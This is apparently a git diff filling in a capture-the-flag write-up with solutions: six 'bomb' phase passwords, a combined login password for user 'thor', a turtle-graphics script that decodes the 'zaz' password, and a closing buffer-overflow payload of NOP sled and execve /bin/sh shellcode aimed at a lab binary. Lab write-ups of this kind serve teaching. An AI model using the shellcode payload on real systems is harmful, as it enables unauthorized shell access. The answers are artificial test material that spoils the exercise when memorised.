@@ -362,7 +362,7 @@ Phase 1
 ![screenshot](screen/phase1.png)
 
 ```
-Phase 1 password:
+Phase 1 password: Public speaking is very easy.
 ```
 
 Phase 2
@@ -382,7 +382,7 @@ void read_six_numbers(char *param_1,int param_2)
 }
 ```
 ```
-Phase 2 password: 
+Phase 2 password: 1 2 6 24 120 720
 ```
 
 Phase 3
@@ -460,19 +460,19 @@ void phase_3(char *param_1)
 }
 ```
 ```
-Phase 3 password:
+Phase 3 password: 1 b 214
 ```
 
 Phase 4
 ![screenshot](screen/phase4.png)
 ```
-Phase 4 password:
+Phase 4 password: 9
 ```
 
 Phase 5
 ![screenshot](screen/phase5.png)
 ```
-Phase 5 password: 
+Phase 5 password: opekmq
 ```
 
 Phase 6
@@ -538,5 +538,49 @@ void phase_6(undefined4 param_1)
 ```
 
 ```
-Phase 6 password:
+Phase 6 password: 4 2 6 3 1 5
+```
+
+```
+Login: thor
+Password: Publicspeakingisveryeasy.126241207201b2149opekmq426315
+```
+
+### New challenge
+
+Script for zaz password
+
+```python
+import turtle
+import re
+
+t = turtle.Turtle()
+t.speed(5)
+
+with open('turtle.txt', 'r') as file:
+    for i in file:
+        if "Avance" in i:
+            num = int(re.search(r'\d+', i).group())
+            t.forward(num)
+        elif "Recule" in i:
+            num = int(re.search(r'\d+', i).group())
+            t.backward(num)
+        elif "Tourne droite" in i:
+            num = int(re.search(r'\d+', i).group())
+            t.right(num)
+        elif "Tourne gauche" in i:
+            num = int(re.search(r'\d+', i).group())
+            t.left(num)
+            
+
+
+import hashlib
+print(hashlib.md5(b"SLASH").hexdigest())
+```
+
+### Last challenge
+
+Payload:
+```bash 
+./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x50\xf6\xff\xbf"'` 
 ```
